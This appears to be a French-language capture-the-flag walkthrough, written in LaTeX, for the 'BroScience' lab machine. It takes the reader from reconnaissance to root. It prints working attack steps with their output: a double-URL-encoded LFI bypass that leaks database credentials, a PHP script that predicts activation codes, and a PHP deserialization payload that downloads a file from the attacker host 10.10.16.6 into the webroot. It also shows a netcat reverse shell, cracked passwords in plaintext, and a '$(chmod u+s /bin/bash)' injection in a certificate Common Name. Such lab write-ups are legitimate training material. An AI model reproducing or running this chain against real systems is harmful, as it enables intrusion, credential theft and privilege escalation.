\chapter{XXXXX}
\begin{itemize}
    \item {\bf technics}: lfi, activation code brute-force,
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.54 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: BroScience : Home
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsection{http/https}
\subsubsection{http}

\begin{verbatim}
$ ffuf -u http://10.10.11.195 \
    -H 'Host: FUZZ.broscience.htb' \
    -w     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
    \-fw 20 -mc all

#www                    [Status: 400, Size: 306, Words: 26, Lines: 11, Duration: 30ms]
#mail                   [Status: 400, Size: 306, Words: 26, Lines: 11, Duration: 28ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1181 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
\end{verbatim}

\begin{verbatim}
$ curl -I http://broscience.htb
HTTP/1.1 301 Moved Permanently
Date: Thu, 12 Jan 2023 15:43:19 GMT
Server: Apache/2.4.54 (Debian)
Location: https://broscience.htb/
Content-Type: text/html; charset=iso-8859-1
\end{verbatim}


\begin{verbatim}
$ ffuf -u http://broscience.htb/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -fc 301
NEANT
\end{verbatim}


\subsubsection{https}
\begin{verbatim}
$ ffuf -u https://broscience.htb \
    -H 'Host: FUZZ.broscience.htb' \
    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    -fl 147 -mc all

power2                  [Status: 200, Size: 1371, Words: 92, Lines: 19, Duration: 57ms]
pub2                    [Status: 200, Size: 1369, Words: 92, Lines: 19, Duration: 71ms]
greece                  [Status: 200, Size: 1371, Words: 92, Lines: 19, Duration: 316ms]
xoap                    [Status: 200, Size: 1369, Words: 92, Lines: 19, Duration: 317ms]
rts                     [Status: 200, Size: 1368, Words: 92, Lines: 19, Duration: 305ms]
sib                     [Status: 200, Size: 1368, Words: 92, Lines: 19, Duration: 312ms]
carla                   [Status: 200, Size: 1370, Words: 92, Lines: 19, Duration: 309ms]
voipa058                [Status: 200, Size: 1373, Words: 92, Lines: 19, Duration: 306ms]
branch                  [Status: 200, Size: 1371, Words: 92, Lines: 19, Duration: 303ms]
mediawiki               [Status: 200, Size: 1374, Words: 92, Lines: 19, Duration: 300ms]
twin                    [Status: 200, Size: 1369, Words: 92, Lines: 19, Duration: 293ms]
voipa061                [Status: 200, Size: 1373, Words: 92, Lines: 19, Duration: 311ms]
clark                   [Status: 200, Size: 1370, Words: 92, Lines: 19, Duration: 305ms]
#www                    [Status: 400, Size: 322, Words: 26, Lines: 11, Duration: 40ms]
#mail                   [Status: 400, Size: 322, Words: 26, Lines: 11, Duration: 33ms]
\end{verbatim}


par contre:
\begin{verbatim}
$ curl -k -s https://broscience.htb -H 'Host: branch.broscience.htb' | sha256sum
06b4f7576134fe05b45cfbb47526e4d40ea580a33cf8cfe0012b9b9cf9c544cf  -
$ curl -k -s https://broscience.htb -H 'Host: clark.broscience.htb' | sha256sum
06b4f7576134fe05b45cfbb47526e4d40ea580a33cf8cfe0012b9b9cf9c544cf  -

\end{verbatim}


\begin{verbatim}
$ whatweb https://broscience.htb | tr ',' '\n'
https://broscience.htb [200 OK] Apache[2.4.54]
 Cookies[PHPSESSID]
 Country[RESERVED][ZZ]
 HTTPServer[Debian Linux][Apache/2.4.54 (Debian)]
 IP[10.10.11.195]
 Script
 Title[BroScience : Home]
\end{verbatim}


\begin{verbatim}
$ ffuf -u https://broscience.htb/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
    -e .php -fc 301
login.php               [Status: 200, Size: 1936, Words: 567, Lines: 42, Duration: 49ms]
register.php            [Status: 200, Size: 2161, Words: 635, Lines: 45, Duration: 35ms]
user.php                [Status: 200, Size: 1309, Words: 300, Lines: 29, Duration: 41ms]
comment.php             [Status: 302, Size: 13, Words: 3, Lines: 1, Duration: 28ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
activate.php            [Status: 200, Size: 1256, Words: 293, Lines: 28, Duration: 36ms]

\end{verbatim}


après la création d'un compte on a bien un vhost qui pop même sans activation:
\begin{verbatim}
$ curl -k -I https://broscience.htb -H 'Host: jubeaz.broscience.htb'
HTTP/1.1 200 OK
Date: Thu, 12 Jan 2023 16:02:40 GMT
Server: Apache/2.4.54 (Debian)
Set-Cookie: PHPSESSID=4hbgdg92rct3sgidruqlehg4fj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8


$ curl -ks 'https://broscience.htb/login.php' -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H 'Cookie: PHPSESSID=uuc93npmov6q8rcuphheq3tiet' \
    --data-raw 'username=jubeaz&password=jubeaz' |grep Account
Account is not activated yet  
\end{verbatim}


bon en faisant un peu de browsing:
\begin{verbatim}
https://broscience.htb/user.php?id=4

$ ffuf -u https://broscience.htb/user.php?id=FUZZ -w ./numbers -fl 29

4                       [Status: 200, Size: 1963, Words: 720, Lines: 46, Duration: 89ms]
5                       [Status: 200, Size: 1969, Words: 720, Lines: 46, Duration: 80ms]
1                       [Status: 200, Size: 1992, Words: 720, Lines: 46, Duration: 80ms]
2                       [Status: 200, Size: 1964, Words: 720, Lines: 46, Duration: 72ms]
3                       [Status: 200, Size: 1973, Words: 720, Lines: 46, Duration: 97ms]
\end{verbatim}

donc on a:
\begin{verbatim}

dmytro Member since 1 year ago Email Address dmytro@broscience.htb Total exercises posted 0 Total comments posted 0 Is activated Yes Is admin No
john Member since 1 year ago Email Address john@broscience.htb Total exercises posted 1 Total comments posted 3 Is activated Yes Is admin No
michael Member since 2 years ago Email Address michael@broscience.htb Total exercises posted 2 Total comments posted 1 Is activated Yes Is admin No 
bill Member since 4 years ago Email Address bill@broscience.htb Total exercises posted 2 Total comments posted 1 Is activated Yes Is admin No 
administrator Member since 4 years ago Email Address administrator@broscience.htb Total exercises posted 3 Total comments posted 1 Is activated Yes Is admin Yes 
\end{verbatim}

un truc qui parait bizzare dans le fuzz des fichiers c'est que je n'avais pas
le repertoire des images:
\begin{verbatim}
$ ffuf -u https://broscience.htb/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -fc 301
icons                   [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 29ms]
includes                [Status: 200, Size: 1753, Words: 115, Lines: 21, Duration: 34ms]
manual                  [Status: 200, Size: 676, Words: 15, Lines: 14, Duration: 30ms]
javascript              [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 30ms]
styles                  [Status: 200, Size: 1134, Words: 74, Lines: 18, Duration: 31ms]
\end{verbatim}

on a acces à la doc apache
et dans includes:
\begin{verbatim}
[ ]	db_connect.php	2023-01-12 18:35 	337 	 
[ ]	header.php	2023-01-12 18:35 	369 	 
[ ]	img.php	2023-01-12 18:35 	483 	 
[ ]	navbar.php	2023-01-12 18:35 	1.2K	 
[ ]	utils.php	2023-01-12 18:35 	3.0K	 
\end{verbatim}

ca vaudrait le coup de tester une injection sql tout de suite:

par contre on ne peut pas le faire dans commentaire car il faut avoir un
compte.

\begin{verbatim}
$ sqlmap -r /tmp/login.req --force-ssl 
\end{verbatim}

donc ne semble pas vuln.
\begin{verbatim}
$ ffuf -u https://broscience.htb/includes/img.php?FUZZ=bench.png \ 
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs 39 -mc all

path                    [Status: 200, Size: 31116, Words: 113, Lines: 122, Duration: 40ms]
\end{verbatim}

\begin{verbatim}
$ curl -iks https://broscience.htb/includes/img.php?path=../includes/img.php
HTTP/1.1 200 OK
Date: Fri, 13 Jan 2023 00:45:48 GMT
Server: Apache/2.4.54 (Debian)
Content-Length: 30
Content-Type: text/html; charset=UTF-8

<b>Error:</b> Attack detected.

#url encode
$ curl -ks 'https://broscience.htb/includes/img.php?path=%3D..%2Fincludes%2Fimg.php%0A'
<b>Error:</b> Attack detected.
# full

# double
$ curl -ks 'https://broscience.htb/includes/img.php?path=%3D%2E%2E%2F%69%6E%63%6C%75%64%65%73%2F%69%6D%67%2E%70%68%70%0A'
<b>Error:</b> Attack detected.

# double
$ curl -ks 'https://broscience.htb/includes/img.php?path=%25%32%45%25%32%45%25%32%46%25%36%39%25%36%45%25%36%33%25%36%43%25%37%35%25%36%34%25%36%35%25%37%33%25%32%46%25%36%39%25%36%44%25%36%37%25%32%45%25%37%30%25%36%38%25%37%30'
<?php
if (!isset($_GET['path'])) {
    die('<b>Error:</b> Missing \'path\' parameter.');
}

// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path

#../includes/db_connect.php

$ curl -ks 'https://broscience.htb/includes/img.php?path=%25%32%45%25%32%45%25%32%46%25%36%39%25%36%45%25%36%33%25%36%43%25%37%35%25%36%34%25%36%35%25%37%33%25%32%46%25%36%34%25%36%32%25%35%46%25%36%33%25%36%46%25%36%45%25%36%45%25%36%35%25%36%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30'
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}

$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../../../../../../etc/passwd' | ./urlenc -l | ./urlenc -l)"
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
\end{verbatim}

on recup le code pour analyse.

\begin{verbatim}
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../includes/utils.php' | ./urlenc -l | ./urlenc -l)" > source/utils.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../includes/db_connect.php' | ./urlenc -l | ./urlenc -l)" > source/db_connect.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../includes/activate.php' | ./urlenc -l | ./urlenc -l)" > source/activate.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../activate.php' | ./urlenc -l | ./urlenc -l)" > source/activate.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../login.php' | ./urlenc -l | ./urlenc -l)" > source/login.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../register.php' | ./urlenc -l | ./urlenc -l)" > source/register.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../logout.php' | ./urlenc -l | ./urlenc -l)" > source/logout.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../user.php' | ./urlenc -l | ./urlenc -l)" > source/user.php
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../comment.php' | ./urlenc -l | ./urlenc -l)" > source/comment.php

\end{verbatim}


on recup aussi le \verb+php.ini+ pour voir si on a des trucs sur la session 
\begin{verbatim}
$ curl -ks ht"tps://broscience.htb/includes/img.php?path=$( echo '../../../../../../../etc/php/7.4/apache2/php.ini' | ./urlenc -l | ./urlenc -l)"
\end{verbatim}

pas d'injection sql, le seul moyen semble d'essayer de brute force l'activation
code pour après pouvoir atteindre de la deserialization.

Le truc c'est que le code utilise \verb+srand(time())+ puis \verb+rand()+ donc
un PRNG. En plus comme le serveur nous envoie gentilement sa date dans les
headers
\begin{verbatim}
$ curl -Iks http://broscience.htb
HTTP/1.1 301 Moved Permanently
Date: Fri, 13 Jan 2023 03:58:36 GMT
Server: Apache/2.4.54 (Debian)
Location: https://broscience.htb/
Content-Type: text/html; charset=iso-8859-1
\end{verbatim}


en plus il ne semble pas y avoir d'expiration sur le code d'activation. 

\begin{verbatim}
<?php
$response_time = strtotime('Fri, 13 Jan 2023 03:58:36 GMT');
$shift=10;
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
for ($j = 0 ; $j < $shift; $j++) {
    srand($response_time -$j);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo "\n";
    echo $activation_code;
}
?>
\end{verbatim}

\begin{verbatim}
$ ffuf -u https://broscience.htb/activate.php?code=FUZZ \
    -w ./activation_codes.txt -fr Invalid

5XBKA4VWWOotaZxB0DwTI3DyMeWUh9fG [Status: 200, Size: 1251, Words: 292, Lines: 28, Duration: 102ms]
\end{verbatim}

pour la partie deserialization il y a un objet que l'on peut exploit:
\begin{verbatim}
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
\end{verbatim}

donc on a de quoi ecrire un reverseshell puis un \verb+phar+

\verb+file_get_contents+ A URL can be used as a filename with this function if
the fopen wrappers have been enabled

\verb+allow_url_fopen+ This option enables the URL-aware fopen wrappers that enable accessing URL
object like files. Default wrappers are provided for the access of remote files
using the ftp or http protocol, some extensions like zlib may register
additional wrappers.

from \verb+php.ini+
\begin{verbatim}
; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; http://php.net/allow-url-fopen
allow_url_fopen = On
\end{verbatim}


donc on ecrit le code suivant :

\begin{verbatim}
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

function gen_payload(){
    $a = new AvatarInterface();
    $a->tmp = 'http://10.10.16.6:4444/payload.php';
    $a->imgPath = './payload.php';
    echo serialize($a);
    echo "\n";
    echo base64_encode(serialize($a));
    echo "\n";

}
\end{verbatim}

\begin{verbatim}
$ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.11.195 - - [14/Jan/2023 02:01:54] "GET /payload.php HTTP/1.0" 200 -
10.10.11.195 - - [14/Jan/2023 02:01:55] "GET /payload.php HTTP/1.0" 200 -
10.10.11.195 - - [14/Jan/2023 02:01:55] "GET /payload.php HTTP/1.0" 200 -
\end{verbatim}


et donc au final 
\begin{verbatim}
$ curl -k https://broscience.htb/payload.php

$ nc -lnvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.11.195 42308
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
www-data@broscience:/var/www/html$$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

\end{verbatim}


\section{www-data}

on etabli le port forward:
\begin{verbatim}
$ ./chisel server -p 9999 --reverse
2023/01/14 02:17:01 server: Reverse tunnelling enabled
2023/01/14 02:17:01 server: Fingerprint GwYNvZ/CuB32GMZDh3F5677CTFAv5djzwiF6g9Cx/74=
2023/01/14 02:17:01 server: Listening on http://0.0.0.0:9999
2023/01/14 02:18:08 server: session#1: tun: proxy#R:5555=>5432: Listening


www-data@broscience:/var/www/html$ ./chisel client 10.10.16.6:9999 R:5555:127.0.0.1:5432
<chisel client 10.10.16.6:9999 R:5555:127.0.0.1:5432
2023/01/13 20:18:07 client: Connecting to ws://10.10.16.6:9999
2023/01/13 20:18:07 client: Connected (Latency 26.938561ms)

\end{verbatim}


\begin{verbatim}
$ psql -h localhost -p 5555 -d broscience -U dbuser
Password for user dbuser:
psql (14.6, server 13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.
broscience=> \d
                List of relations
 Schema |       Name       |   Type   |  Owner
--------+------------------+----------+----------
 public | comments         | table    | postgres
 public | comments_id_seq  | sequence | postgres
 public | exercises        | table    | postgres
 public | exercises_id_seq | sequence | postgres
 public | users            | table    | postgres
 public | users_id_seq     | sequence | postgres
(6 rows)

broscience=> select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_cr
eated
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+----------------
---------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:0
2:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:3
4:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:1
2:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:4
5:53.118482-04
  5 | dmytro
\end{verbatim}

\begin{verbatim}
$ echo 15657792073e8a843d4f91fc403454e1 |hashid
Analyzing '15657792073e8a843d4f91fc403454e1'
[+] MD2
[+] MD5
[+] MD4
\end{verbatim}


dans le code de \verb+register.php+ on a:
\begin{verbatim}
res = pg_execute(.. .SNIP. ...md5($db_salt . $_POST['password']).. .SNIP. ..
\end{verbatim}

avec \verb+$db_salt = "NaCl";+


donc 

\begin{verbatim}
$ cat hashes
administrator:15657792073e8a843d4f91fc403454e1
bill:13edad4932da9dbb57d9cd15b66ed104
michael:bd3dad50e2d578ecba87d5fa15ca5f85
john:a7eed23a7be6fe0d765197b1027453fe
dmytro:5d15340bded5b9395d5d14b9c21bc82b

$ sed 's/^/NaCl/' /usr/share/wordlists/passwords/rockyou.txt > newrockyou.txt 

$ john --wordlist=newrockyou.txt hashes --format=raw-MD5-opencl
Device 1@honbu: NVIDIA GeForce GTX 1050 Ti
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (raw-MD5-opencl [MD5 OpenCL])
Note: This format may be a lot faster with --mask acceleration (see doc/MASK).
Press 'q' or Ctrl-C to abort, almost any other key for status
NaCliluvhorsesandgym (bill)
NaClAaronthehottest (dmytro)
NaCl2applesplus2apples (michael)
\end{verbatim}

\section{bill}

\verb+ bill / iluvhorsesandgym+



\begin{verbatim}
$ ssh bill@broscience.htb
bill@broscience.htb's password:
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
bill@broscience:~$
\end{verbatim}

\begin{verbatim}
bill@broscience:~$ ./linpeas.sh -q -P iluvhorsesandgym > linpeas.out
\end{verbatim}


on a un fichier qui semble interessant dans \verb+/opt+

\begin{verbatim}
bill@broscience:~$ cat /opt/renew_cert.sh
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;

\end{verbatim}


\verb+pspy+ crash mais vu le contenu du script.

donc si le certificat expire bientot en principe \verb+root+ en regen un. Par
contre  \verb+/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"+
ca c'est une erreur car si on place une commande dans le commonName du certif
que l'on renew la commande va être executée.


\begin{verbatim}
bill@broscience:~/Certs$  openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
Generating a RSA private key
........................................++++
.....................++++
writing new private key to 'broscience.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(chmod u+s /bin/bash)



$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
bill@broscience:~/Certs$ /bin/bash -p
bash-5.1# id
uid=1000(bill) gid=1000(bill) euid=0(root) groups=1000(bill)
bash-5.1# cat /root/root.txt

\end{verbatim}
